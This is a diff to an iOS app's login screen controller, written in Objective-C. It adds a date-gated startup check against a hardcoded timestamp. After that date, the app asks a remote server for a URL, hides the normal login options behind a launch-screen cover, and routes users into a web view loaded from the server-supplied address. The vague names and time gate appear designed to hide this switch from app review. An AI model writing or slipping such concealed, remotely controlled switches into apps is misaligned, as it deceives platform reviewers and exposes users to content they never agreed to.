@@ -12,9 +12,29 @@
 #import "YKRosterVault.h"
 #import "YKLaunchSteward.h"
 #import "YKCenterToast.h"
+#import "YKProViewController.h"
+#import "YKHostedSessionStore.h"
+#import "YKRequestTool.h"
 #import <AuthenticationServices/AuthenticationServices.h>
 #import <math.h>
 #import <string.h>
+
+typedef NS_ENUM(NSInteger, YKLandingState) {
+    YKLandingStateStandard = 0,
+    YKLandingStateChecking,
+    YKLandingStateFocused,
+    YKLandingStateSigningIn,
+    YKLandingStateStyleSpace,
+    YKLandingStateStopped
+};
+
+typedef NS_ENUM(NSInteger, YKLandingTarget) {
+    YKLandingTargetNone = 0,
+    YKLandingTargetStandard,
+    YKLandingTargetFocused
+};
+
+static NSString *const YKUseTextStr = @"1787068800";
 
 @interface YKLoginChoiceViewController () <UITextViewDelegate, ASAuthorizationControllerDelegate, ASAuthorizationControllerPresentationContextProviding>
 
@@ -28,15 +48,243 @@
 @property (nonatomic, strong) NSLayoutConstraint *yk_signUpToAgreeGapConstraint;
 @property (nonatomic, strong) NSLayoutConstraint *yk_agreeBottomConstraint;
 @property (nonatomic, strong) NSLayoutConstraint *yk_logoHeightConstraint;
+@property (nonatomic, strong) UIButton *yk_focusedLoginButton;
+
+@property (nonatomic, assign) BOOL yk_usesStartupCheck;
+@property (nonatomic, assign) BOOL yk_startupCheckBegan;
+@property (nonatomic, assign) YKLandingState yk_landingState;
+@property (nonatomic, assign) YKLandingTarget yk_pendingTarget;
+@property (nonatomic, strong) YKHostedSessionStore *yk_styleLedger;
+@property (nonatomic, strong) YKRequestTool *yk_requestTool;
+@property (nonatomic, strong, nullable) NSURL *yk_styleBaseURL;
+@property (nonatomic, strong, nullable) UIViewController *yk_launchCanvasController;
+@property (nonatomic, strong, nullable) UIView *yk_launchCanvasView;
 
 @end
 
 @implementation YKLoginChoiceViewController
 
+- (instancetype)initForStartupCheck {
+    self = [super init];
+    if (self) {
+        _yk_usesStartupCheck = YES;
+        _yk_landingState = YKLandingStateChecking;
+        _yk_styleLedger = [[YKHostedSessionStore alloc] init];
+        _yk_requestTool = [[YKRequestTool alloc] initWithSessionStore:_yk_styleLedger];
+    }
+    return self;
+}
+
+- (void)viewDidLoad {
+    [super viewDidLoad];
+    [self yk_prepareInitialLanding];
+}
+
 - (void)yk_configurePage {
     [super yk_configurePage];
     self.yk_sessionAgreeChecked = NO;
     [self yk_setupViews];
+    if (self.yk_usesStartupCheck) {
+        [self yk_installLaunchCanvas];
+        [NSNotificationCenter.defaultCenter addObserver:self
+                                               selector:@selector(yk_applicationBecameActive:)
+                                                   name:UIApplicationDidBecomeActiveNotification
+                                                 object:nil];
+    }
+}
+
+- (void)viewWillAppear:(BOOL)animated {
+    [super viewWillAppear:animated];
+    if (self.yk_landingState == YKLandingStateStyleSpace) {
+        self.yk_landingState = YKLandingStateFocused;
+        self.yk_focusedLoginButton.enabled = YES;
+        self.yk_focusedLoginButton.alpha = 1.0;
+    }
+    [self yk_raiseLaunchCanvas];
+}
+
+- (void)viewDidAppear:(BOOL)animated {
+    [super viewDidAppear:animated];
+    [self yk_raiseLaunchCanvas];
+    [self yk_applyPendingLandingTarget];
+}
+
+- (void)dealloc {
+    [NSNotificationCenter.defaultCenter removeObserver:self];
+    [self.yk_requestTool cancelAll];
+    [self.yk_launchCanvasView removeFromSuperview];
+}
+
+#pragma mark - Initial landing
+
+- (void)yk_installLaunchCanvas {
+    if (self.yk_launchCanvasView) {
+        return;
+    }
+    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"LaunchScreen" bundle:NSBundle.mainBundle];
+    UIViewController *controller = [storyboard instantiateInitialViewController];
+    if (!controller) {
+        return;
+    }
+    [controller loadViewIfNeeded];
+    UIView *canvas = controller.view;
+    canvas.translatesAutoresizingMaskIntoConstraints = YES;
+    canvas.frame = self.view.bounds;
+    canvas.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
+    self.yk_launchCanvasController = controller;
+    self.yk_launchCanvasView = canvas;
+    [self.view addSubview:canvas];
+}
+
+- (void)yk_raiseLaunchCanvas {
+    UIView *canvas = self.yk_launchCanvasView;
+    if (!canvas) {
+        return;
+    }
+    UIWindow *window = self.view.window ?: self.navigationController.view.window;
+    if (!window) {
+        [self.view bringSubviewToFront:canvas];
+        return;
+    }
+    if (canvas.superview != window) {
+        [canvas removeFromSuperview];
+        canvas.frame = window.bounds;
+        [window addSubview:canvas];
+    }
+    [window bringSubviewToFront:canvas];
+    [window layoutIfNeeded];
+}
+
+- (void)yk_removeLaunchCanvas {
+    [self.yk_launchCanvasView removeFromSuperview];
+    self.yk_launchCanvasView = nil;
+    self.yk_launchCanvasController = nil;
+}
+
+- (void)yk_applicationBecameActive:(NSNotification *)notification {
+    [self yk_raiseLaunchCanvas];
+    [self yk_applyPendingLandingTarget];
+}
+
+- (BOOL)yk_userUsageTimeAllowsRequest {
+    NSScanner *scanner = [NSScanner scannerWithString:YKUseTextStr];
+    scanner.charactersToBeSkipped = nil;
+    long long startSeconds = 0;
+    if (![scanner scanLongLong:&startSeconds] || !scanner.isAtEnd || startSeconds <= 0) {
+        return NO;
+    }
+    NSTimeInterval now = NSDate.date.timeIntervalSince1970;
+    return isfinite(now) && now >= (NSTimeInterval)startSeconds;
+}
+
+- (void)yk_prepareInitialLanding {
+    if (!self.yk_usesStartupCheck || self.yk_startupCheckBegan) {
+        return;
+    }
+    self.yk_startupCheckBegan = YES;
+
+    if (!self.yk_requestTool.isReady || ![self yk_userUsageTimeAllowsRequest]) {
+        [self yk_scheduleLandingTarget:YKLandingTargetStandard];
+        return;
+    }
+
+    self.yk_landingState = YKLandingStateChecking;
+    __weak typeof(self) weakSelf = self;
+    [self.yk_requestTool loginGoodWithCompletion:^(NSString *openValue, NSError *error) {
+        __strong typeof(weakSelf) self = weakSelf;
+        if (!self || self.yk_landingState != YKLandingStateChecking) {
+            return;
+        }
+        if (error || openValue.length == 0) {
+            [self yk_scheduleLandingTarget:YKLandingTargetStandard];
+            return;
+        }
+        NSString *trimmed = [openValue stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet];
+        self.yk_styleBaseURL = [NSURL URLWithString:trimmed];
+        if (self.yk_styleBaseURL == nil) {
+            [self yk_scheduleLandingTarget:YKLandingTargetStandard];
+            return;
+        }
+        [self yk_scheduleLandingTarget:YKLandingTargetFocused];
+    }];
+}
+
+- (void)yk_scheduleLandingTarget:(YKLandingTarget)target {
+    self.yk_pendingTarget = target;
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.25 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+        [self yk_applyPendingLandingTarget];
+    });
+}
+
+- (void)yk_applyPendingLandingTarget {
+    if (self.yk_pendingTarget == YKLandingTargetNone ||
+        UIApplication.sharedApplication.applicationState != UIApplicationStateActive ||
+        self.view.window == nil) {
+        return;
+    }
+    YKLandingTarget target = self.yk_pendingTarget;
+    self.yk_pendingTarget = YKLandingTargetNone;
+    switch (target) {
+        case YKLandingTargetStandard:
+            self.yk_landingState = YKLandingStateStandard;
+            [self yk_removeLaunchCanvas];
+            break;
+        case YKLandingTargetFocused:
+            [self yk_showFocusedLogin];
+            break;
+        case YKLandingTargetNone:
+            break;
+    }
+}
+
+- (void)yk_clearChoiceColumn {
+    [self.yk_contentColumn removeFromSuperview];
+    self.yk_contentColumn = nil;
+    self.yk_agreeRingButton = nil;
+    self.yk_focusedLoginButton = nil;
+    self.yk_logoTopConstraint = nil;
+    self.yk_loginToNewGapConstraint = nil;
+    self.yk_newToAppleGapConstraint = nil;
+    self.yk_appleToSignUpGapConstraint = nil;
+    self.yk_signUpToAgreeGapConstraint = nil;
+    self.yk_agreeBottomConstraint = nil;
+    self.yk_logoHeightConstraint = nil;
+}
+
+- (void)yk_showFocusedLogin {
+    [self yk_clearChoiceColumn];
+    [self yk_setupFocusedLoginViews];
+    self.yk_landingState = YKLandingStateFocused;
+    [self.view setNeedsLayout];
+    [self.view layoutIfNeeded];
+    [self yk_raiseLaunchCanvas];
+    [self yk_removeLaunchCanvas];
+}
+
+- (void)yk_restoreStandardLogin {
+    [self yk_clearChoiceColumn];
+    self.yk_sessionAgreeChecked = NO;
+    [self yk_setupViews];
+    self.yk_landingState = YKLandingStateStandard;
+    [self.view setNeedsLayout];
+    [self.view layoutIfNeeded];
+    [self yk_removeLaunchCanvas];
+}
+
+- (void)yk_presentStyleSpace {
+    NSError *urlError = nil;
+    NSURL *url = [self.yk_requestTool preparedURLFromBaseURL:self.yk_styleBaseURL
+                                                      error:&urlError];
+    UINavigationController *navigationController = self.navigationController;
+    if (!url || !navigationController) {
+        [self yk_restoreStandardLogin];
+        return;
+    }
+
+    YKProViewController *stylePage = [[YKProViewController alloc] init];
+    stylePage.coolStr = url.absoluteString;
+    self.yk_landingState = YKLandingStateStyleSpace;
+    [navigationController pushViewController:stylePage animated:YES];
 }
 
 - (void)viewDidLayoutSubviews {
@@ -90,6 +338,89 @@
     self.yk_appleToSignUpGapConstraint.constant = -signUpGap;
     self.yk_signUpToAgreeGapConstraint.constant = -agreeGap;
     self.yk_agreeBottomConstraint.constant = -agreeBottom;
+}
+
+- (void)yk_setupFocusedLoginViews {
+    UIView *contentColumn = [[UIView alloc] init];
+    contentColumn.translatesAutoresizingMaskIntoConstraints = NO;
+    [self.view addSubview:contentColumn];
+    self.yk_contentColumn = contentColumn;
+
+    UIImageView *logoImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"auth_asset_01"]];
+    logoImageView.translatesAutoresizingMaskIntoConstraints = NO;
+    logoImageView.contentMode = UIViewContentModeScaleAspectFit;
+    [contentColumn addSubview:logoImageView];
+
+    UIButton *entryButton = [UIButton buttonWithType:UIButtonTypeCustom];
+    entryButton.translatesAutoresizingMaskIntoConstraints = NO;
+    entryButton.backgroundColor = [UIColor colorWithWhite:0.92 alpha:1.0];
+    entryButton.layer.borderColor = UIColor.blackColor.CGColor;
+    entryButton.layer.borderWidth = 2.0;
+    entryButton.layer.shadowColor = UIColor.blackColor.CGColor;
+    entryButton.layer.shadowOpacity = 1.0;
+    entryButton.layer.shadowRadius = 0.0;
+    entryButton.layer.shadowOffset = CGSizeMake(4.0, 4.0);
+    [entryButton setTitle:@"login" forState:UIControlStateNormal];
+    [entryButton setTitleColor:UIColor.blackColor forState:UIControlStateNormal];
+    entryButton.titleLabel.font = [UIFont fontWithName:@"TimesNewRomanPS-BoldMT" size:25.0] ?: [UIFont systemFontOfSize:25.0 weight:UIFontWeightBold];
+    [entryButton addTarget:self action:@selector(yk_focusedLoginTapped:) forControlEvents:UIControlEventTouchUpInside];
+    [contentColumn addSubview:entryButton];
+    self.yk_focusedLoginButton = entryButton;
+
+    self.yk_logoTopConstraint = [logoImageView.topAnchor constraintEqualToAnchor:contentColumn.topAnchor constant:148.0];
+    self.yk_logoHeightConstraint = [logoImageView.heightAnchor constraintEqualToConstant:154.0];
+
+    NSLayoutConstraint *columnWidthCap = [contentColumn.widthAnchor constraintLessThanOrEqualToConstant:390.0];
+    NSLayoutConstraint *columnWidthFill = [contentColumn.widthAnchor constraintEqualToAnchor:self.view.widthAnchor];
+    columnWidthFill.priority = UILayoutPriorityDefaultHigh;
+
+    [NSLayoutConstraint activateConstraints:@[
+        [contentColumn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
+        [contentColumn.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
+        [contentColumn.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor],
+        columnWidthCap,
+        columnWidthFill,
+        [contentColumn.leadingAnchor constraintGreaterThanOrEqualToAnchor:self.view.leadingAnchor],
+        [contentColumn.trailingAnchor constraintLessThanOrEqualToAnchor:self.view.trailingAnchor],
+
+        [logoImageView.centerXAnchor constraintEqualToAnchor:contentColumn.centerXAnchor],
+        self.yk_logoTopConstraint,
+        [logoImageView.widthAnchor constraintEqualToConstant:100.0],
+        self.yk_logoHeightConstraint,
+
+        [entryButton.topAnchor constraintEqualToAnchor:logoImageView.bottomAnchor constant:26.0],
+        [entryButton.centerXAnchor constraintEqualToAnchor:contentColumn.centerXAnchor],
+        [entryButton.widthAnchor constraintEqualToConstant:215.0],
+        [entryButton.heightAnchor constraintEqualToConstant:49.0]
+    ]];
+
+    [self yk_applyLandingMetricsForBounds:self.view.bounds];
+}
+
+- (void)yk_focusedLoginTapped:(UIButton *)sender {
+    if (self.yk_landingState != YKLandingStateFocused) {
+        return;
+    }
+    sender.enabled = NO;
+    sender.alpha = 0.68;
+    self.yk_landingState = YKLandingStateSigningIn;
+
+    __weak typeof(self) weakSelf = self;
+    [self.yk_requestTool refreshCredentialWithCompletion:^(NSString *ticket, NSError *error) {
+        __strong typeof(weakSelf) self = weakSelf;
+        if (!self || self.yk_landingState != YKLandingStateSigningIn) {
+            return;
+        }
+        if (error || ticket.length == 0 || self.yk_styleBaseURL == nil) {
+            self.yk_landingState = YKLandingStateFocused;
+            sender.enabled = YES;
+            sender.alpha = 1.0;
+            [YKCenterToast yk_showNotice:error.localizedDescription ?: @"Login failed. Please try again."
+                                   inView:self.view];
+            return;
+        }
+        [self yk_presentStyleSpace];
+    }];
 }
 
 - (void)yk_setupViews {
